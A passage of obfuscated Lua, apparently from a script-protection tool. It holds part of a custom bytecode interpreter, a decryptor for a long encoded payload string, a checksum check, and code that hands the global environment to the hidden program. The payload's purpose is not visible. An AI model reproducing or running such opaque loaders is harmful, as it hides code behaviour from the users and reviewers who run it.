local _pq = _tc[_xk]
local n = (_im == 0) and (_pb - _xk) or (_im - 1)
if _tn == 2 then
if n == 0 then _tc[_xk] = _pq()
elseif n == 1 then _tc[_xk] = _pq(_tc[_xk + 1])
elseif n == 2 then _tc[_xk] = _pq(_tc[_xk + 1], _tc[_xk + 2])
elseif n == 3 then _tc[_xk] = _pq(_tc[_xk + 1], _tc[_xk + 2], _tc[_xk + 3])
else
local _hw = {}
for _as = 1, n do _hw[_as] = _tc[_xk + _as] end
_tc[_xk] = _pq(_fu(_hw, 1, n))
end
elseif _tn == 1 then
if n == 0 then _pq()
elseif n == 1 then _pq(_tc[_xk + 1])
elseif n == 2 then _pq(_tc[_xk + 1], _tc[_xk + 2])
elseif n == 3 then _pq(_tc[_xk + 1], _tc[_xk + 2], _tc[_xk + 3])
else
local _hw = {}
for _as = 1, n do _hw[_as] = _tc[_xk + _as] end
_pq(_fu(_hw, 1, n))
end
else
local _si
if n == 0 then _si = _qv(_pq())
elseif n == 1 then _si = _qv(_pq(_tc[_xk + 1]))
elseif n == 2 then _si = _qv(_pq(_tc[_xk + 1], _tc[_xk + 2]))
elseif n == 3 then _si = _qv(_pq(_tc[_xk + 1], _tc[_xk + 2], _tc[_xk + 3]))
elseif n == 4 then _si = _qv(_pq(_tc[_xk + 1], _tc[_xk + 2], _tc[_xk + 3], _tc[_xk + 4]))
else
local _hw = {}
for _as = 1, n do _hw[_as] = _tc[_xk + _as] end
_si = _qv(_pq(_fu(_hw, 1, n)))
end
if _tn == 0 then
local _ol = _si.n
for _as = 1, _ol do _tc[_xk + _as - 1] = _si[_as] end
if _ol == 0 then _tc[_xk] = nil end
_pb = _xk + _ol - 1
else
local _dk = _tn - 1
for _as = 1, _dk do _tc[_xk + _as - 1] = _si[_as] end
end
end
_ad = _ad + 4
elseif _le == 7 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
_tc[_xk] = _im + _tn
_ad = _ad + 4
elseif _le == 5 then
if _tc[_xk] then _ad = _ad + 4 else _ad = _ad + f1qaf9[_ad + 2] * 4 end
elseif _le == 35 then
_ad = _ad + _xk * 4
elseif _le == 17 then
local _hw = _tc[_xk]
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
_hw[_im] = _tn
_ad = _ad + 4
elseif _le == 21 then
_tc[_xk] = f1qaf9[_ad + 2]
_ad = _ad + 4
elseif _le == 42 then
if _tc[_xk] then _ad = _ad + f1qaf9[_ad + 2] * 4 else _ad = _ad + 4 end
elseif _le == 16 then
local _im = f1qaf9[_ad + 2]
if _im == 0 then
local n = _pb - _xk + 1
if n <= 0 then return end
local _hw = {}
for _as = 1, n do _hw[_as] = _tc[_xk + _as - 1] end
return _fu(_hw, 1, n)
end
local n = _im - 1
if n <= 0 then return end
local _hw = {}
for _as = 1, n do _hw[_as] = _tc[_xk + _as - 1] end
return _fu(_hw, 1, n)
elseif _le == 15 then
local _im = f1qaf9[_ad + 2]
for _as = _xk, _xk + _im - 1 do _tc[_as] = nil end
_ad = _ad + 4
elseif _le == 2 or _le == 37 or _le == 13 or _le == 40 or _le == 27 or _le == 12 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
if _le == 2 then _tc[_xk] = (_im == _tn)
elseif _le == 37 then _tc[_xk] = (_im ~= _tn)
elseif _le == 13 then _tc[_xk] = (_im < _tn)
elseif _le == 40 then _tc[_xk] = (_im <= _tn)
elseif _le == 27 then _tc[_xk] = (_im > _tn)
else _tc[_xk] = (_im >= _tn) end
_ad = _ad + 4
elseif _le == 1 or _le == 25 or _le == 36 or _le == 10 or _le == 38 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
if _le == 1 then _tc[_xk] = _im - _tn
elseif _le == 25 then _tc[_xk] = _im * _tn
elseif _le == 36 then _tc[_xk] = _im / _tn
elseif _le == 10 then _tc[_xk] = _im % _tn
else _tc[_xk] = _im ^ _tn end
_ad = _ad + 4
elseif _le == 29 then
_tc[_xk] = (f1qaf9[_ad + 2] ~= 0)
_ad = _ad + 4
elseif _le == 18 then
_tc[_xk] = {}
_ad = _ad + 4
elseif _le == 41 then
local _hw = _tc[_xk]
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im == 0 then _im = _pb - _xk end
local _hh = _tn - 1
for _as = 1, _im do _hw[_hh + _as] = _tc[_xk + _as] end
_ad = _ad + 4
elseif _le == 19 then
local _im = _tc[f1qaf9[_ad + 2]]
local _tn = f1qaf9[_ad + 3]
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
_tc[_xk] = _im[_tn]
_tc[_xk + 1] = _im
_ad = _ad + 4
elseif _le == 24 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
local _wu = _tc[_im]
for _as = _im + 1, _tn do _wu = _wu .. _tc[_as] end
_tc[_xk] = _wu
_ad = _ad + 4
elseif _le == 23 then
local _rs = f30zch[f1qaf9[_ad + 2]]
local f7zbmk = {}
local _vp = _rs.f7zbmk
for _as = 1, #_vp do
local _gr = _vp[_as]
if _gr.f270e8 then f7zbmk[_as] = _tc[_gr.f6dj0k] else f7zbmk[_as] = _xz[_gr.f6dj0k] end
end
_tc[_xk] = function(...) return _bx(_rs, _qv(...), f7zbmk) end
_ad = _ad + 4
elseif _le == 4 then
local _im = f1qaf9[_ad + 2]
if _im == 0 then
for _as = 1, _ea do _tc[_xk + _as - 1] = _ty[_as] end
_pb = _xk + _ea - 1
else
local n = _im - 1
for _as = 1, n do _tc[_xk + _as - 1] = _ty[_as] end
end
_ad = _ad + 4
elseif _le == 33 then
_tc[_xk] = _xz[f1qaf9[_ad + 2]][1]
_ad = _ad + 4
elseif _le == 32 then
_xz[_xk][1] = _tc[f1qaf9[_ad + 2]]
_ad = _ad + 4
elseif _le == 9 then
_tc[_xk] = {}
_ad = _ad + 4
elseif _le == 11 then
_tc[_xk] = _tc[f1qaf9[_ad + 2]][1]
_ad = _ad + 4
elseif _le == 20 then
local _hw = _tc[_xk]
_hw[1] = _tc[f1qaf9[_ad + 2]]
_ad = _ad + 4
elseif _le == 28 then
local _hw = _tc[_xk]
local n = f1qaf9[_ad + 3] - 1
local _as = f1qaf9[_ad + 2]
while _as <= _pb do n = n + 1; _hw[n] = _tc[_as]; _as = _as + 1 end
_ad = _ad + 4
elseif _le == 31 then
local _pq = _tc[_xk]
if type(_pq) ~= 'function' then
local _hw = getmetatable(_pq)
local _im, _tn
if type(_hw) == 'table' then _im = rawget(_hw, '__iter'); _tn = rawget(_hw, '__call') end
if _im ~= nil then
_tc[_xk], _tc[_xk + 1], _tc[_xk + 2] = _im(_pq)
elseif type(_pq) == 'table' and (_hw == nil or (type(_hw) == 'table' and _tn == nil)) then
_tc[_xk], _tc[_xk + 1], _tc[_xk + 2] = next, _pq, nil
end
end
_ad = _ad + 4
elseif _le == 8 then
_oa[_jy[_xk]] = _tc[f1qaf9[_ad + 2]]
_ad = _ad + 4
elseif _le == 6 then
local _im = f1qaf9[_ad + 2]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
_tc[_xk] = -_im
_ad = _ad + 4
elseif _le == 34 then
local _im = f1qaf9[_ad + 2]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
_tc[_xk] = not _im
_ad = _ad + 4
elseif _le == 3 then
local _im = f1qaf9[_ad + 2]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
_tc[_xk] = #_im
_ad = _ad + 4
elseif _le == 22 then
local _im, _tn = f1qaf9[_ad + 2], f1qaf9[_ad + 3]
if _im >= 256 then _im = _jy[_im - 256] else _im = _tc[_im] end
if _tn >= 256 then _tn = _jy[_tn - 256] else _tn = _tc[_tn] end
_tc[_xk] = math.floor(_im / _tn)
_ad = _ad + 4
else
error(('E'..tostring(_le)), 0)
end
end
end
return _bx(_dz, { n = 0 }, {})
end
local function _us(_wu, _mu, _zb)
_mu = _mu or 1
local function KMVX8(_xk,_tn)
_xk=_xk%256 _tn=_tn%256
local r,_lt=0,1
for _=1,8 do
local _sx,w=_xk%2,_tn%2
if _sx~=w then r=r+_lt end
_xk=(_xk-_sx)/2 _tn=(_tn-w)/2 _lt=_lt*2
end
return r
end
_zb = _zb or 38391
local function _cy()
local _im = string.byte(_wu, _mu)
_mu = _mu + 1
_zb = (_zb * 1879 + 36344) % 65521
local _jy = _zb % 256
local v = _im - _jy
if v < 0 then v = v + 256 end
return v
end
local function _nz()
local n, _kd = 0, 1
while true do
local _im = _cy()
n = n + (_im % 128) * _kd
if _im < 128 then break end
_kd = _kd * 128
end
return n
end
local function _ya()
local n = _nz()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _jc()
local _lt = {}
_lt.fjbz1 = _nz()
_lt.f6fl5a = (_cy() == 1)
_lt.f1rcji = _nz()
local _nk = _nz()
_lt.f7zbmk = {}
for _as = 1, _nk do
local f270e8 = (_cy() == 1)
_lt.f7zbmk[_as] = { f270e8 = f270e8, f6dj0k = _nz() }
end
local _gg = _nz()
_lt.k = {}
for _as = 1, _gg do
local _be = _cy()
if _be == 0 then _lt.k[_as] = nil
elseif _be == 1 then _lt.k[_as] = false
elseif _be == 2 then _lt.k[_as] = true
elseif _be == 5 then
_lt.k[_as] = _ya()
elseif _be == 3 or _be == 4 then
local _zm = _nz()
local _qr = {}
local m = 127
for j = 1, _zm do
_qr[j] = string.char(KMVX8(_cy(), m))
m = (m * 99 + 69) % 256
end
if _be == 3 then _lt.k[_as] = tonumber(table.concat(_qr)) else _lt.k[_as] = table.concat(_qr) end
else
_lt.k[_as] = nil
end
end
local _ve = _nz()
local _jn, _yl = _nz(), _nz()
_lt.f1qaf9 = {}
if _ve > 0 then
local _uo = {}
for _as = 1, _ve do
_uo[_as * 4 - 3] = _nz()
_uo[_as * 4 - 2] = _ya()
_uo[_as * 4 - 1] = _ya()
_uo[_as * 4] = _ya()
end
local _uz = {}
for _as = 0, _ve - 1 do _uz[((_as * _jn) + _yl) % _ve] = _as end
for _as = 1, _ve do
local _bt = _uz[_as - 1] + 1
local q = _as * 4
local _gr = _bt * 4
_lt.f1qaf9[_gr - 3] = _uo[q - 3]
_lt.f1qaf9[_gr - 2] = _uo[q - 2]
_lt.f1qaf9[_gr - 1] = _uo[q - 1]
_lt.f1qaf9[_gr] = _uo[q]
end
end
local _qg = _nz()
_lt.f30zch = {}
for _as = 1, _qg do _lt.f30zch[_as] = _jc() end
return _lt
end
local _rs = _jc()
return _rs, _mu, _zb
end
local _d34={
("gFUE7TiPO0FuOInOx3nuHtGlDFBevsTseGC8EKhRelrp3jNIK4xvZOXeTgVjmvEiFrY5q8XKcLnpVDqpgj-OhwTbSAlCLB25v3qh6Xd70Ffanc_Q_ncWsN6_6S3vWxdYo7F3SmAC1mwlMv-QCVPINtBiJ9auoEaWuIE6MiS7HhDN5Dx2WVGRdwEvhUgu_NWyfJKFVBwIvtuPqZhO3Co3OFUM1lxPUe3vwAUoJx1vCC4-pkh1GGy876Fd43EwhsZOThb4T3cO2yex1e5m0a0Cyox1t5ITid4ocov58Y9XpGbmaVsotJc8DH4UWReNxiSBiIRW6KrCRY-N9zBM3X2Jq5mIwiyNB49PSWD4CDvIj4UHMf1xzqGei494yAulu9-wKXUo0cIjGDMSklGCVJ_PVbX0KauFMlDm49AcsS_VMe85lhUWyPfIOkAI3sLtpazNpqRwtrRBX9TPKcf4k3px2VODGKGv7sNBavdx2Yxse13_8d1ehkmu2adhxlI-GPsG3NkYpNMHJ4DiC8Cg2RQqvH6mQt-2_hKxwv47fneGZ0RdYCzn1XHKmy2DGCrDkkTVz66OXxhwVKZnbPGXkdkp2INVtTOpQgsXPvzhJroGwMBIl9VmD6suxMnQiN5keAAUFn_htbBxboNL8weEhhf2Vk4fsBmawQcfSbx5zpO1fIqTnnITqTHE5-3P6uRMusRf-RNgKD8gAkLNtsE4Qg8ihv3aTb63mPRkjze6hFwTlnz5YWvE9tYpoQ85W_d0iziTIOfc936k22mDBvuKFWMO_sn0bgUQqRkBtpkrHcrdcVLXL_RO7CO6KqEPM8w66s6cdu0vRio2jYhTibL_8F5PDrddZtQ4-GDo5W1XRtrIS2m8QYxjagCd2iyWhSglZgQa31mW1AMILYrnArRj2OaGSR7x7K9C94IqAFNKNRzb1qGSmeRrZrmXzL_5OHYP0HaqEjHRsJ07d6Jhv2VmocSBBmxyIpENCUvvouddHCfzQ5-KDSeKfuwUlWdE1HEK3ZebzpCZ10SC4Tvijl_ENuLHIzL2cZDp_aZ8PdC59Yh0ZcpvSWcdnCF_rBgv2uGfljcHfC7bXloXmTb7TiwoxSTzImnu-ZWKZsdSvT20IuL7Rx6QS4-B2jUc7ujAk_A2vYYihSb2CApp7FG-ScBED-pRwxhbxDD8plYN0BdJ7EvySOpTX71e8MJhhw7UUH-3opmGz1tvTlDmI1-o9ASUkhLR4FNTF67Sx1xvA3e0wNrw0leRsSQMY17RIwEpsCteE6FsHZHkZURdg3pIH-bX76L5pv9yUfd3wJOMS4qOsaW6qISzH9zi_otPTCBISvTyDHM4T7-zCcLN9kA3MgyN8XH5tqfrLXkM4CQIY7hlXEweHUcOu25GrMAkoNYWwnX8qiBa14_LIm07TJjAAnZU0r8pOsI_Wnau2QO_K7bgu3S6h5POT-v9d_rsxYpmtCIjqorJjEAXv8Gdz7pOMf5NkFYEcpZ9rhO4rw1TTFjUmeixyP66jQowk_SATp9b9iiJv9IqBLbup0HrG4Zdzeg6NGbeOIqjxWE8Wsjix5H-gJecezPZZh-s9DFWTJ88_6dGepWuNeatDhf2g1T8AQwS7lnZXFcvAvNbnASV28SxVuZe0o87V_ePo7Sd_qkUandju3AjtMg9w2trenlt0pjhCTwWULJjM-4b0xvVWSN9-xpipSeCQ9avoaZnLNyi-BBxLW7tJWvKfM-WSz5CopZy8784Fn18GuQ9-WEfVrL5vlb83wtL44kCV7TRKofhiJyj7rR9ZqyEv-HGIZ_TzK".."mv3y-ZTOWCF3oZ8quGOr6U6mi0mP-B-AAgn8NqE_SEikv1rcrNZ7P30VcAM6Hmke3lGu9Vtylrz2n6wn0W2ETDXrifb-3FtWVlvdCSE1sLoUEiuyBJzG0CgqAehuH69UW9_cCTa6jc9apBonSJCn22KkRHUWBUYR8vXw7TCwQagUtVXYzdoJH0pCxdoVjBUguOT8yC7EH6O8ArKz09O2T38ecpn4Dd0TH9dC_wK2wm-Kp-WZkES9T14BctWDsWaLDIpJgjqqn4Mo4orotYlO9eC7ouYdGeN3BSDcximAJBoXQLsjL6pUPHDS7WkkFpgHvdEytHOOC7PQMGGmZPfVBjVtT2neIbKzbarK-zonYL34Zm1co1stf83kLv8FMcfJom0r7SAeZ22ZSPGEseLRP3oFkwmLgjQqIhmgRLQV2cGXdLeVR1FbNyjDtNA49ncpzizEVltX-TGYhTJg1PDCs2FUs-FDAbCaR5xHXb7sLJ5pwA_eFw6dsRMJqy6sqWUXmN3heEwMcwF3LmkgxKreyymmiacdtUR5YNFV8lMZUkPOW0-so5XVdmjNzBhs73fw3ys1rNtHnbeDcstN-iA0E-fHO4ItuCsQYjGwqS5x5REEhWJkbKHiZWJAC_c03LqvsEo_PNDwbS-PkWH7CcXrAPGSNKXEp6BQRhonL9tnSvR0XiD0xUSEdteASVVqYzoTspXZtUuCt5MBG_aK_vT4LzzQSaJPMX852X0p62Cn6kJ4jZDcGDDsol04wIHoBPzP1OTdv7ZUsDU6u2aGWev5YwtskSykeA-5DzC5rEW2U8YGGryPPBC5_ltDOKYdcQHU2kjKeRaduqiI3zShb_wa81y9xagaVivdZMVGRV6dTSmCpsZsuiBhPM9dfEY0gmyOhlq1IC05EFHbiUuLPo2023ROQdYPRJ7s8ljwDILrSqE7v_ZKVxk97DZ5NHVCKBt9nRgAvWH88Y-SdQD2k82883w6NijHXih_m6SvZY-q5k_0aXeQqhmQ6vud9P0M6xQrW1w4GevWNdK-_SvZFm_GM04w52ArhyRK9ehHZBtEra_YuNwk34-_gI7rly7hifLK5gkNnPmV8izufeSoDLkU5adqBoyPhiGMJKDfw40_UBD1a2a34METuRo8S3J4OeOwTqLhSNGcMZ9_1c3k0JKjYi_IhlPXpoka_DZFk-2gH0OPrLIjj2plFkT_idbtRC_ebKmKoxmka9dRDay_A4lxv_hcZQDzraosApl2EKmsrFIV2Uod8AH94qh40j7PuyVRp5bSn8gljl8CkMiMC9pSjYwcM9bJNpTHf7NBLOElzVy-2ZBumgcRiTODsXf_ktf5lBFBmq_ZzYE3AFfXVrAbRzXODzmDxUoCrdN8OwNiAr7f2nTuwEHuGBKHa5RnYbLsNly7oqHwUxMas5GRVTDnb4EgALK".."MXufHOTqXa6vIOz8bcg0YmPSoFjufnoR9XDAmOPQ0i_9Z1x4G8GwuZLVdZiLoYWKhUvrFveHm8uvUr30jmqN7F_wj6kV8WFcA_gYReTUobLI3lJj98yKS83VNNU3f90z_Se-5isTQHoBqmWoLKKCbbNthuwSTYGfcY3B1stzJFFv883DJIzdlmgC0frZMdW0ORbL7uG72rtl_Rs7qt5V5DiZlKogJxsDrbDW2I0hAb0MhlA8rO330b-GZnfIXaq3Z4h0BgZBjKVDeOnqHk5l-Vu_ARDJrr5lz_ruHSDW1EKd41d_IsFAYE3HKgpOiOqU8t10Mt9mHDXDTc1qUtJx8vDM9gLRDbNdOiyjAWOzePeyRNPPw1NSTTryO3Kghtn0_orDQWEAQscftqVsmVBpKlM0IWq8PwaWYkcMSMwZnFHfEOb9JZ5e0HPtUT3Gvtcbcg9ZoJUy2lzJujO9JkBj7ry8DbodAercdftDchGNyqpvq0rVYicvt8gNOISr9pNh14jN35SKz5iPQHOg7oR3e0X-xtgWgCTJWtBrBpHQIEVr5rLm4td1dVooHQhqIc_DSbxWgatIse79lgoUMcSaltuHnV6oC5nm0jE6k4CwB88YYBmug9-SMLfWV7dy3Z-FzynhhckuFbu5ion6etvD9YjuCp5yTmjeMERZutnW8Xmaooi2z9Ef0hIIM_jgwVOGLYvwPu5Lp_HHkgpOq5_Wv1EMuhxqA-9ECRcqzYxbHZprhLvMf94DjniZEAXd31Qc7qHKsS6Moj7q5AHRc24Ni8dHMKkxeiWUkIU51kICekB5BUaCeJOzluqxPWRP2hRYeVk-NnBGU9CfE8oln8BF3hSdFvM4pypWbZy8q1VR44L-vCtJPxPN1RMV5EoBqmENDOXGQyCKFDxFjXIBNZULX9BA4WEW__kp-C2YSwKcQRBNlVNgz95o4DyZ2STgCL1Udfi5h7pqlOePKZViNXzOsUwMgi5sEwXZ_qneIzEnv7pLYpaGgypbhUh9F5It1_eRWKemWu1NEfx4JilPQJrWjv8m4CXFwSJ2tWuINWCwAC8aH4r8YN_TzT2JPyADOLVI1WmIvRrQhkO-ZKt63KUXmDidASStzvDz4Dk_SWX0NmpUMaVakiveFeEW6hcQI0t8HAS3MxBO5FkBLQVB8Fx5XthEDynpI8MuKee2-_RZb5Eb3lcPAVGd401_jERC0X5UVDcrikZmoO5tKIubf1hhNZIM3rjEogtkaCfCc5LZ28HTZrEJuu7CYojes6hnbrxapZBWNBNzr5nzbXBpEfLXwC13FIDP_iPuakUCd17YO1Oars_5c6k8pMfRJnZTTSOi38OpyGVQ_MtU6KTLaYQncISD6RfiUljo5_D7t7orFcDy0QbfZHB9YYaHDXzhJrLe4Gsx4b439XhE1eCcL9E1a4lGSDzySKP4-0qSuDJfgnHDAFEh2FFNf3qeiwyKbcLvhNWl-8vwlpyO4DwMn-EFc9JF66mSBKE1PIrph-EJUeT83bLJozAG7bFrEZXSX_nEdboM6Zxzxkq7TWVJg7UIaYhdZGY6pB8LyW1suDTHcUFeFDT8b_rhqjpf2JUlYu9LbefcOEsVhnoCingWdwUCRzi38aO2J_urym_b0iyo75hwUuZOEBQ54_9tIwqEiHA5xWNtTWitaeTSSO1SE-M8d_HJwCVsp6QPdVJoIDmQ41puZc6Oee3Mdozjfr0NneclP-X8pNB8XpMnNadgxS8HJPh9D2f5AIt8xQkRhLMEk1s30wi4jf7v0C_siZVNeWfaZVHjDn7luwnwH-3lxLtfZTYjvYszfLppgOV-p6F9qV6DxBIHvhTtE2I3sLUEYUjck1SY3M5S0CRE8KhFKspefMkcWPhuVbeu5j1QvdJUsYZoFuKaK_ZBsmEk6w69jUnRMM7zsB-m2el2JOUQVqpvMWFXi9IZALvafornbfaO-s1qnc2iqT3jzYYithMaQp0AInCAjqlo7x_NuKT8wf36qRMh8NsddNn2rmeMJvrLI7TK1bhZmgBpXigVQZ2-mhIDr6rQO4igevGlSsdi1keRlIftpwC9tDfQDrIpu_ldJw0nUSM5-_pA5cF4RXqvYM1SuweP9H-4_B23WIKV2wkKBFwY0ujglydHGeIkE5WNOUryMaq8GdILVXnKQ5ONgXUtrzVNB_hvHERXVm9DtsL701RAL5mArke2a2Ott1nQReEF21lcmsWrKTq2THK8iA1Q-oUh7btF6PTrz-bH1qozwjqW0CMNcrPcAlUWc-9S3OVIID3-fRPa9N75m-Wjl5YBVxTvkh2SpRjZVrQDciJg4zKvbGX3lypI7viULCOk7l50-TqWkM8_fTQp3thlHus-27e0SEuciLg1ty5-1d26FMoV8GQDqKfNCrT4s-DPx26iVgeQA4_k5mw3TLpbZcjt1emgZLEZ6NNNNvh4QqtiHYpEE4MRfGbmafMKIG-qQRFsJ6sCxllU0Zbue3O18eCxpY9m8E0ael80gV4XF-lYq4ss3Kv_NvycZhTmivokqZsR2T-gjYWNkRYKV7ALdxDcFbfbY7Niph3VASoC2yrWVWLrXA42sshFZfTJYJ3x8iNaf4dUD3lSsnE3RIMA9p2bWTRqnZGNzmFpOZNK7Pwkl-3C4h68bCZGKZzEzBw9uHQE2SdDtnLZWBKmbMaEURZJkBcR3RIzePHYTKr_sawXxapnab-NYX5qwea1FSxI9gdlPE-lhgQsKcGBJVBeVfF35Kv7-PMafbqzyatcCLMxtsQbgMPNdj-so0RruswuHH_07uhouIeHB4iFRUDBDaZ0a9eoPJoVB784nmdzVIvQtDZJEiMX8xolDoq6U5r1yHV6_hOspB9O4XyYCmGo94lVXFLxDFQobtkCPLJxcVwq59Bpg5BAIgCM-Y0euL8b0FPShWFTXFNuB2hhPiD5aWAmhq-SpV6V4Cp5aalEqgr06IGa5yMbP2U9ve62-nLnd-mj9Ym1hQY4zloOpK_iiOCCxOlT6UTFmyQfkBGY6X0_-Fe4EXtKqNSpYsQd_p5GZsoIfJ_1KsL4IXRRrEgZqhdOUwvFsejl0ZpHIj5Fy8krjYAeiz-0Wrrg_TTPTQDxEwuYDmsCdfQ0uWErb2K8GTfCs9YCQouDBUnPTRtBUGF2zwfPrb6-B7bszrJe3qI2cdX7s5P28fYyHWa2t0aPLXXsYCdCU4-d9JlLVQ1sWUAvWUogCjp52mBQJreQCx_uO4hWAQ3khnNrESGkoL3S-eBVuzYgT9CBU3ZOR-OSfqdUp3h2yI1RknMJZH39IyygqU7syjyL_XzDZCyIhyyx5m1VobGG4OXHRoVT9s22l5AJ8sLIEpBfCRhbxeU-q5usMskQm2dKrhc8t0uQOgFA2JXxUlry141nyoh4apjYBdVT1vHEriJEdWCQdvqDmxZ198_r6Er2COJWIw232yHlnbglO8KX03ayBVvzdY99jOtoGu4q-mEA-eooitqp88aJl3IvVGlkgO5UPDSCyLuDjDggVplLsF0jOW9NJjlAGNUHsRTGKvupe_UQp_9I60benH9tsXIgEcqXOVqFba-1Z28G-lAOlbtqJBke4QuU36BYdoXsGnZbVNvln9T4zfOTLCvVs1Q8mySU1UN65s47slAsG3BKJ_YKFUP7uXe7YoK".."mXrMooK4GdSSUsva3K38_nDLqX9Ct_YiVFOmIxz4MtNBkMauLGpaaS3tkHhO84SosIMHTaUGgKpNjOD0WiMQaRAUff8wJ9VHnxrr5Kji9xsfL42-8nXd5I67TxNHJ9j2Wgm_3Cj9BBYWgTIfKkHEf5Xtx2ylVTA2dQ6DpdKHDl-yvD_TRtIhENVbvzqS73ifBSIp7Ci9hgPwYhRpBcaycdm5pzyHVh2QDzx_qHPEsI7aYAUgKQx7wp-ALjrdEHXC9O3KO24F5_Gvn12Jm6r06gbThp5KM6JHKixeVu0lETf8vcy2fU3fwbk_vO9h4UibLAfALNLQjq0dnFxp1BlW1I0NdM0QYVI4I2lca17TxWdnNxKadnzxZvitjDzkgLErncfXyzY5w9ROMomx7aHBHOLG7o73YppuY6U_DNrvUxMBhqqdOfHRVgZRxpqUpxv5zrypR0u_DNTwNcZvsY_IzocRoizP8qsnYg5mTgRrHSXjrzvfVzGmE3E4oIrlXDYvMwo5qF9wLmD-9oBpIefdkP1a87j3qjqJYGkJifAdC4kQ34fwGNJhXGKN9qh2zBZq05NChny43scJAkcv947fDZt8_O3CyZoQjsPXxTWfvH28fsuZ5PKUOS4GVnRZD-hYx1POY3mvgEdelwewf6PSbB8N0g199fJilxEAykRqUJowD8WS9Cb6lY_zk3guFZ-4Q64f0RIihpjLfE6RrFsUPjjBoA3veydOfQR16JAq82zjiQNj09M_moui-j4BORJ0fBJTxuwvqTTg87rejxZrU9j3OYwORmaB03vIJdCOZ50dPR5WwMSVihkbBve597zptRTu7NryOWZWvW5YWp5fRqhQO889bQXGkE2TIvVusD1iHEmuG77sPhzgxUUBE94248mqFy6FdKGjtg2ne4Iz-cNbrgftEoKENY6WpWWmyOzI7QeyTaDr45a_0jQjpPTDNdFnpaSHpg8gG3JxTp0izaJuWdn9yaqWJ0xYsZg5kSYBdFx3lFS9XF-nnjv_eFQunxSe_3_ZO9eQDO3KhsZcP6WCgUT0CKP08CEaO1SmIQXyQRx12aMVhtNZ"),
}
local _0f9f={1}
local _65={} for i=1,#_0f9f do _65[i]=_d34[_0f9f[i]] end
local _0d7,_a2=_0(_f64d(table.concat(_65)))
if _a2~=3708317997 then error(string.char(50,48,48,48),0) end
local _b16
pcall(function() if type(getfenv)=="function" then _b16=getfenv(1) end end)
if type(_b16)~="table" then pcall(function() _b16=_ENV end) end
if type(_b16)~="table" then _b16=_G end
local _c2,_66,_5b=_us(_0d7)
local _4=_jr(_c2,_b16)
return _4
end)()
end)()
if type(_1c1d94) ~= "table" or type(_1c1d94[1]) ~= "function" or type(_1c1d94[2]) ~= "function" then
  _7ad16d(string.char(80,114,111,116,101,99,116,105,111,110,32,117,110,97,118,97,105,108,97,98,108,101))
  return
end
local _8467a6={}
for i=0,255 do _8467a6[i]=string.char(i) end
local _c43b6c,_41804c={},{}
do
  local ta="cf1c0e9d49d5d9eec756f3875480ad3ca692531ff697bccd67c9ddbdc5288816ab8ad8e3051795780f984270826ba51451a13964226c416a6599ca8350295812725a1925dfd15cfa81c3683e31184f1032139e57fef7968d244d91c0e533438930b273b77627a87c7f35384b5dd06100f8941ee920bf0702dbf0e7b015ec0c37fce079715b5e2b4ac60190092c84ed34e4b46f2eba1bfb2d470b8ecc7d6d932666630385de3a86b5f91ad340e677b904ebb3c1e123d29a06c89f9ca3cebbc4f27a361dae62a4dc11693f083ba00ada5f7eaa44749bf4e84eafa7f56e592ad7b6acb84c8bd4b1eaa221f1be48450de27b46fda960efcb558c8f2fff7552d63dc2"
  local tb="48e87f818ee9104b80e1e0f8bb1458682049a3a4c6b10f2bf1952cfe478d438fda7b125b63bcc3d719df22531b6c7024a8dc2d9337f9d4999b67acfb1e368917b7a190e6e53d6b8286caeff6a9dd65a2de573b08abb4f51f85aad569db9f5544c876405de49e8cb97ccdce73619cd077d85c4cfdcc0c6218d6726f462750be3359e33eea1ceb357484875a7ac175d9096e3fc200bde23a320afa8ac705aec454782607f0b56a39c594b0b8238304afad1306294203bac03456b3a66d4d459641d3a01d281ad1cb66ec2f3c8b52114a4f0e97719da52e21f40d7ecf16a7e70b9a92ee2a795ff3b625f2b25e88f7bfed309164c94e15fcd27d38ff985160310102"
  for i=1,256 do
    _c43b6c[tonumber(string.sub(ta,i*2-1,i*2),16)]=i-1
    _41804c[tonumber(string.sub(tb,i*2-1,i*2),16)]=i-1
  end
end
local _9c39f5={}
do
  local a="NsKqzAkiLje-TY_BlrPvCSO5Q4Jn1y3a" .. "97IbZ6RVEXtgfMm0UuFDHhGw2Wdxc8op"
  for i=1,#a do _9c39f5[string.byte(a,i)]=i-1 end
end
local function _ebb722(s)
  local out,n,acc,bits={},0,0,0
  for i=1,#s do
    local v=_9c39f5[string.byte(s,i)]
    if v then
      acc=acc*64+v
      bits=bits+6
      if bits>=8 then
        bits=bits-8
        local d=2^bits
        n=n+1
        out[n]=_8467a6[math.floor(acc/d)%256]
        acc=acc%d
      end
    end
  end
  return table.concat(out)
end
local function _3b894f(s)
  local v=0.0
  for i=1,#s do v=v*16+tonumber(string.sub(s,i,i),16) end
  return v
end
local function _9697a2(s)
  local h=0
  for i=1,#s do h=(h*33+string.byte(s,i))%4294967296 end
  return h
end
local function _ba9e40(S)
  local sa,pa=2107509971,190
  local sb,pb=4085219451,119
  local MA,AA,LA=766219,-1366068975,327777
  local MB,AB,LB=68305,-1529293431,16265536
  local KA={195,254,249,222,242,139,162,124,240,182,6,218,4,201,218,192,222,210,117,192,69,158,222,129,158,216,175,231,232,152,95,24}
